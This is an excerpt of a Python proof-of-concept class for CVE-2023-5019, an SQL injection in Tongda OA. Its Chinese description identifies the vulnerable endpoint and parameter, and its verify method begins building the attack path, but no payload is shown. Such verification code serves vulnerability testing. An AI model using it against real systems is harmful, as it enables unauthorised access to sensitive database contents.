...
class POC(POCBase):
    ...
    desc = '''
        近日，通达OA中一处SQL注入漏洞的细节于互联网公开，漏洞编号：CVE-2023-5019，漏洞危害等级：中危。
        通达OA 后台中存在SQL注入漏洞，由于对用户输入过滤不足，拥有系统登录权限的攻击者可以利用general/hr/manage/staff_reinstatement/delete.php 接口的$REINSTATEMENT_ID参数执行SQL注入攻击，从而获取数据库中的敏感信息。
    '''
  ...
  # 漏洞简要描述
    ...
    def _verify(self):
        result = {}
        path = "/general/hr/manage/staff_reinstatement/delete.php?REINSTATEMENT_ID="
